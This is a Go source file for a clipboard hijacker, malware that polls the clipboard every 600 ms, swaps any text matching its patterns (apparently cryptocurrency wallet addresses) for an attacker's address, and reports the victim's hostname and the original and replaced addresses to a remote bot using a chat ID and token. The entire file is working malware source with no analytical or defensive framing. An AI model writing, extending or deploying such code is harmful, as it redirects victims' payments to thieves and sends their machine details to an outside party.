package main

import (
	"fmt"
	"os"
	"time"

	"github.com/atotto/clipboard"
)

// main clipper func
func StartClipper() {
	go func() {
		var lastClipboardContent string
		hostname, _ := os.Hostname()

		for {
			time.Sleep(600 * time.Millisecond)

			currentContent, err := clipboard.ReadAll()
			if err != nil {
				continue
			}

			if currentContent == lastClipboardContent {
				continue
			}

			matched := false
			for _, matcher := range matchers {
				if matcher.regex.MatchString(currentContent) {
					originalAddr := currentContent

					err = clipboard.WriteAll(matcher.addr)
					if err != nil {
						continue
					}

					lastClipboardContent = originalAddr
					matched = true

					SendLog(
						fmt.Sprintf(
							"%s\n\n%s → %s",
							hostname,
							originalAddr,
							matcher.addr,
						),
						chat_id,
						bot_token,
					)

					break
				}
			}

			if !matched {
				lastClipboardContent = currentContent
			}
		}
	}()
}
